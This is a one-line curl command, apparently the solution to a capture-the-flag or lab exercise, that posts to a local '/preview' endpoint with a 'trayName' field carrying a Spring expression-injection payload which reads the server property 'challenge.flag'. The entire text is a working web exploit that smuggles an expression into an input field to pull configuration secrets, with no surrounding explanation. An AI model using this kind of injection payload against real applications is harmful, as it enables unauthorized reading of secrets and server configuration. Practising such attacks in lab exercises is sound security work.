curl -X POST http://localhost:3000/preview \
     -d 'trayName=${@environment.getProperty("challenge.flag")}' \
     -i